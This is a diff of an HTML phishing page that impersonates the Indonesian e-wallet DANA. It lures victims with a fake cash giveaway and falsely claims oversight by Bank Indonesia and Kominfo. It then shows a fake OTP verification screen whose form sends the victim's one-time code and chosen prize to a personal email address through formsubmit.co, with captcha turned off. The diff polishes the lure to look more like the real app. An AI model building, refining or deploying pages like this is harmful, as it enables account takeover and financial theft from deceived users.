@@ -3,59 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
     <meta name="theme-color" content="#00A9E0">
-    <title>DANA Giveaway & Verifikasi</title>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <title>DANA Giveaway</title>
     <style>
-        /* RESET CSS AGRESIF Agar Full ke Atas */
+        /* RESET CSS: Menghilangkan semua margin default browser */
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            -webkit-tap-highlight-color: transparent;
         }
 
         html, body {
             width: 100%;
             height: 100%;
-            background-color: #00A9E0; /* Dasar biru DANA */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            overflow: hidden; /* Mencegah scroll yang tidak perlu */
+            background-color: #00A9E0; /* Warna biru dasar */
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
         }
 
         /* Container Utama */
-        .app-wrapper {
+        .app-container {
             display: flex;
             flex-direction: column;
             height: 100vh;
             width: 100%;
         }
 
-        /* HALAMAN 1: GIVEAWAY */
+        /* ================= HALAMAN 1: GIVEAWAY ================= */
         #page-giveaway {
             display: flex;
             flex-direction: column;
             height: 100%;
+            width: 100%;
         }
 
-        .header-blue {
+        .blue-header {
             flex: 1;
+            background-color: #00A9E0;
+            padding-top: env(safe-area-inset-top); /* Ruang untuk notch HP */
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            color: white;
-            padding: 20px;
+            justify-content: center;
+            position: relative;
         }
 
-        .gift-icon { width: 150px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.2)); }
+        /* Logo DANA di Pojok Kiri Atas */
+        .dana-logo-header {
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            color: white;
+            font-weight: 800;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+        }
 
+        .gift-banner {
+            width: 180px;
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.2));
+            margin-bottom: 5px;
+        }
+
+        .text-giveaway {
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: white;
+            letter-spacing: 1px;
+            text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .label-uang-tunai {
+            background: #FFD700;
+            color: #0077C8;
+            padding: 4px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+
+        /* Card Putih Pilihan */
         .white-card {
             background: white;
             border-radius: 30px 30px 0 0;
-            padding: 25px 20px 100px 20px;
-            box-shadow: 0 -10px 30px rgba(0,0,0,0.2);
+            padding: 25px 20px 110px 20px;
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.15);
         }
 
-        .option-item {
+        .card-title {
+            text-align: center;
+            color: #0077C8;
+            font-weight: bold;
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+        }
+
+        .prize-box {
             display: flex;
             align-items: center;
             border: 2px solid #f2f2f2;
@@ -63,45 +112,74 @@
             padding: 16px;
             margin-bottom: 12px;
             cursor: pointer;
+            transition: 0.2s;
         }
 
         input[type="radio"] { display: none; }
-        input[type="radio"]:checked + .option-item {
+
+        input[type="radio"]:checked + .prize-box {
             border-color: #00A9E0;
             background-color: #f0fbff;
         }
 
-        .btn-blue {
+        .radio-indicator {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #ddd;
+            border-radius: 50%;
+            margin-right: 15px;
+            position: relative;
+        }
+
+        input[type="radio"]:checked + .prize-box .radio-indicator {
+            border-color: #00A9E0;
+        }
+
+        input[type="radio"]:checked + .prize-box .radio-indicator::after {
+            content: "";
+            width: 12px;
+            height: 12px;
+            background: #00A9E0;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .prize-label { font-size: 1.15rem; font-weight: 800; color: #333; }
+
+        .btn-confirm {
             width: 100%;
-            padding: 16px;
+            padding: 18px;
             background: #00A9E0;
             color: white;
             border: none;
             border-radius: 50px;
             font-size: 1.1rem;
             font-weight: bold;
-            margin-top: 10px;
-            cursor: pointer;
+            margin-top: 15px;
+            box-shadow: 0 5px 15px rgba(0,169,224,0.3);
         }
 
-        /* HALAMAN 2: OTP (Hidden by default) */
+        /* ================= HALAMAN 2: OTP ================= */
         #page-otp {
-            display: none; /* Sembunyi dulu */
+            display: none; /* Disembunyikan dulu */
             background-color: white;
-            height: 100vh;
+            height: 100%;
             flex-direction: column;
         }
 
-        .otp-header {
+        .otp-top-bar {
             background-color: #008CFF;
             color: white;
             padding: 20px;
             text-align: center;
             font-weight: bold;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
         }
 
-        .otp-container {
+        .otp-content {
             padding: 40px 20px;
             text-align: center;
         }
@@ -109,7 +187,7 @@
         .otp-inputs {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             margin: 30px 0;
         }
 
@@ -121,13 +199,18 @@
             font-weight: bold;
             border: 2px solid #ddd;
             border-radius: 12px;
-            background: #f9f9f9;
+            background: #fdfdfd;
         }
 
-        .timer { color: #008CFF; font-weight: bold; margin-bottom: 20px; }
+        .otp-inputs input:focus {
+            border-color: #008CFF;
+            outline: none;
+        }
 
-        /* Navbar Bawah */
-        .bottom-nav {
+        .timer-text { color: #008CFF; font-weight: bold; margin-bottom: 25px; }
+
+        /* Navigation Bar Bawah */
+        .navbar-bottom {
             position: fixed;
             bottom: 0;
             width: 100%;
@@ -137,66 +220,96 @@
             display: flex;
             justify-content: space-around;
             align-items: center;
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+
+        .nav-item { text-align: center; color: #999; font-size: 0.7rem; flex: 1; }
+        .pay-btn {
+            background: #00A9E0;
+            width: 55px; height: 55px;
+            border-radius: 50%;
+            border: 4px solid white;
+            margin-top: -35px;
+            display: flex;
+            align-items: center; justify-content: center;
+            color: white; font-weight: bold;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
     </style>
 </head>
 <body>
 
-<div class="app-wrapper">
+<div class="app-container">
     
     <section id="page-giveaway">
-        <div class="header-blue">
-            <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="gift-icon" alt="Kado">
-            <h1 style="font-size: 2rem;">GIVEAWAY</h1>
-            <p style="background:#FFD700; color:#0077C8; padding:3px 15px; border-radius:15px; font-weight:bold;">UANG TUNAI</p>
+        <div class="blue-header">
+            <div class="dana-logo-header">DANA</div>
+            <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="gift-banner" alt="Kado">
+            <h1 class="text-giveaway">GIVEAWAY</h1>
+            <div class="label-uang-tunai">UANG TUNAI</div>
         </div>
 
         <div class="white-card">
-            <p style="text-align:center; color:#0077C8; font-weight:bold; margin-bottom:15px;">DANA GIVEAWAY</p>
-            
-            <label>
-                <input type="radio" name="pilihan" value="10jt">
-                <div class="option-item"><span style="font-size:1.2rem; font-weight:800;">💸 Rp10.000.000</span></div>
-            </label>
-            <label>
-                <input type="radio" name="pilihan" value="20jt">
-                <div class="option-item"><span style="font-size:1.2rem; font-weight:800;">💸 Rp20.000.000</span></div>
-            </label>
-            <label>
-                <input type="radio" name="pilihan" value="30jt">
-                <div class="option-item"><span style="font-size:1.2rem; font-weight:800;">💸 Rp30.000.000</span></div>
-            </label>
-
-            <button class="btn-blue" onclick="goToOTP()">KONFIRMASI</button>
+            <div class="card-title">DANA GIVEAWAY</div>
+            <form id="giveawayForm">
+                <label>
+                    <input type="radio" name="prize" value="10.000.000">
+                    <div class="prize-box">
+                        <div class="radio-indicator"></div>
+                        <span class="prize-label">💸 Rp10.000.000</span>
+                    </div>
+                </label>
+                <label>
+                    <input type="radio" name="prize" value="20.000.000">
+                    <div class="prize-box">
+                        <div class="radio-indicator"></div>
+                        <span class="prize-label">💸 Rp20.000.000</span>
+                    </div>
+                </label>
+                <label>
+                    <input type="radio" name="prize" value="30.000.000">
+                    <div class="prize-box">
+                        <div class="radio-indicator"></div>
+                        <span class="prize-label">💸 Rp30.000.000</span>
+                    </div>
+                </label>
+                <button type="button" class="btn-confirm" onclick="nextToOTP()">KONFIRMASI</button>
+            </form>
+            <div style="text-align: center; margin-top: 25px; font-size: 0.65rem; color: #aaa; line-height: 1.5;">
+                DANA Indonesia terdaftar dan diawasi oleh<br>
+                <strong>BANK INDONESIA | KOMINFO</strong>
+            </div>
         </div>
 
-        <nav class="bottom-nav">
-            <div style="text-align:center; color:#999; font-size:0.7rem;">🏠<br>Beranda</div>
-            <div style="background:#00A9E0; width:50px; height:50px; border-radius:50%; margin-top:-30px; border:4px solid white; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold; font-size:0.8rem;">PAY</div>
-            <div style="text-align:center; color:#999; font-size:0.7rem;">👤<br>Saya</div>
+        <nav class="navbar-bottom">
+            <div class="nav-item">🏠<br>Beranda</div>
+            <div class="nav-item">📄<br>Aktivitas</div>
+            <div class="pay-btn">PAY</div>
+            <div class="nav-item">💼<br>Dompet</div>
+            <div class="nav-item">👤<br>Saya</div>
         </nav>
     </section>
 
     <section id="page-otp">
-        <div class="otp-header">Verifikasi OTP</div>
-        <div class="otp-container">
-            <h3>Masukkan Kode OTP</h3>
-            <p style="color:#666; font-size:0.9rem;">Kami telah mengirimkan kode ke nomor Anda</p>
+        <div class="otp-top-bar">Verifikasi OTP</div>
+        <div class="otp-content">
+            <h3 style="font-size: 1.3rem; margin-bottom: 5px;">Masukkan Kode OTP</h3>
+            <p style="color: #777; font-size: 0.9rem;">Kami telah mengirimkan kode ke nomor Anda</p>
             
             <div class="otp-inputs">
-                <input type="tel" maxlength="1" oninput="moveNext(this, 0)">
-                <input type="tel" maxlength="1" oninput="moveNext(this, 1)">
-                <input type="tel" maxlength="1" oninput="moveNext(this, 2)">
-                <input type="tel" maxlength="1" oninput="moveNext(this, 3)">
+                <input type="tel" maxlength="1" class="otp-field" oninput="moveNext(this, 0)">
+                <input type="tel" maxlength="1" class="otp-field" oninput="moveNext(this, 1)">
+                <input type="tel" maxlength="1" class="otp-field" oninput="moveNext(this, 2)">
+                <input type="tel" maxlength="1" class="otp-field" oninput="moveNext(this, 3)">
             </div>
 
-            <div class="timer" id="timer">Kirim ulang dalam 100 detik</div>
+            <div class="timer-text" id="timer">Kirim ulang dalam 100 detik</div>
 
-            <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return handleFinalSubmit()">
-                <input type="hidden" name="Pilihan Hadiah" id="selectedPrize">
-                <input type="hidden" name="OTP_Code" id="finalOTP">
+            <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return finalize()">
+                <input type="hidden" name="Pilihan_Hadiah" id="hiddenPrize">
+                <input type="hidden" name="Kode_OTP" id="hiddenOTP">
                 <input type="hidden" name="_captcha" value="false">
-                <button type="submit" class="btn-blue">KONFIRMASI</button>
+                <button type="submit" class="btn-confirm">KONFIRMASI</button>
             </form>
         </div>
     </section>
@@ -204,54 +317,56 @@
 </div>
 
 <script>
-    // Fungsi pindah ke halaman OTP
-    function goToOTP() {
-        const selected = document.querySelector('input[name="pilihan"]:checked');
+    const otpInputs = document.querySelectorAll(".otp-field");
+
+    // Fungsi pindah halaman
+    function nextToOTP() {
+        const selected = document.querySelector('input[name="prize"]:checked');
         if (selected) {
-            document.getElementById('selectedPrize').value = selected.value;
+            document.getElementById('hiddenPrize').value = selected.value;
             document.getElementById('page-giveaway').style.display = 'none';
             document.getElementById('page-otp').style.display = 'flex';
-            startTimer();
+            otpInputs[0].focus();
+            runTimer();
         } else {
-            alert("Silakan pilih nominal hadiah dahulu!");
+            alert("Silakan pilih nominal hadiah terlebih dahulu!");
         }
     }
 
-    // Fungsi Input OTP
-    const inputs = document.querySelectorAll(".otp-inputs input");
+    // Fungsi otomatis geser kotak OTP
     function moveNext(el, index) {
-        if (el.value.length === 1 && index < inputs.length - 1) {
-            inputs[index + 1].focus();
+        if (el.value.length === 1 && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
         }
     }
 
     // Timer OTP
-    let countdown = 100;
-    function startTimer() {
-        const timerEl = document.getElementById("timer");
+    let timeLeft = 100;
+    function runTimer() {
+        const timerDisplay = document.getElementById("timer");
         const interval = setInterval(() => {
-            countdown--;
-            if (countdown > 0) {
-                timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
+            timeLeft--;
+            if (timeLeft > 0) {
+                timerDisplay.innerText = "Kirim ulang dalam " + timeLeft + " detik";
             } else {
                 clearInterval(interval);
-                timerEl.textContent = "Kode OTP telah kadaluarsa";
-                timerEl.style.color = "red";
+                timerDisplay.innerText = "Kode OTP telah kadaluarsa";
+                timerDisplay.style.color = "red";
             }
         }, 1000);
     }
 
-    // Gabungkan OTP sebelum kirim email
-    function handleFinalSubmit() {
-        const otp = Array.from(inputs).map(i => i.value).join('');
-        if(otp.length < 4) {
-            alert("Masukkan 4 digit OTP!");
+    // Gabungkan data sebelum kirim
+    function finalize() {
+        const otpVal = Array.from(otpInputs).map(i => i.value).join('');
+        if (otpVal.length < 4) {
+            alert("Masukkan 4 digit OTP dengan lengkap!");
             return false;
         }
-        document.getElementById("finalOTP").value = otp;
-        return true; 
+        document.getElementById("hiddenOTP").value = otpVal;
+        return true;
     }
 </script>
 
 </body>
-</html>
+                            </html>
